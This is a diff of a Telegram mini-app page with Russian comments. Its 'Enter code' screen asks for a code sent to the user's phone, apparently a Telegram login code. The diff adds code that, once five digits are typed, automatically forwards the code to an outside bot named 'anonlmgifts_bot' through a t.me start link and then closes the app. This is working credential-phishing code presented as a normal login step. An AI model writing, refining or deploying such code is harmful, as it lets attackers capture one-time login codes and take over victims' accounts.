@@ -21,8 +21,6 @@
     <div id="screen-code" class="hidden">
         <h2>Введите код</h2>
         <p>Код отправлен на <b id="user-phone"></b></p>
-        <p style="font-size: 14px; color: gray;">(Отправится автоматически после 5 цифр)</p>
-        
         <input type="number" id="code-input" placeholder="00000" maxlength="5">
     </div>
 
@@ -45,21 +43,22 @@
                     });
                 };
 
-                // 2. Автоотправка кода
+                // 2. Автоотправка кода через ссылку
                 document.getElementById('code-input').addEventListener('input', function(e) {
                     const code = this.value;
                     
                     if (code.length === 5 && !isSent) {
                         isSent = true; 
-                        this.blur(); // Прячем клавиатуру
+                        this.blur(); 
                         
-                        tg.sendData(JSON.stringify({
-                            action: "login",
-                            code: code
-                        }));
+                        // Твой бот
+                        const botUsername = "anonlmgifts_bot"; 
                         
-                        tg.showAlert("Код отправлен!");
-                        setTimeout(() => tg.close(), 1500);
+                        // Открываем ссылку с кодом
+                        tg.openTelegramLink("https://t.me/" + botUsername + "?start=" + code);
+                        
+                        // Закрываем мини-аппу
+                        setTimeout(() => tg.close(), 500);
                     }
                 });
             }
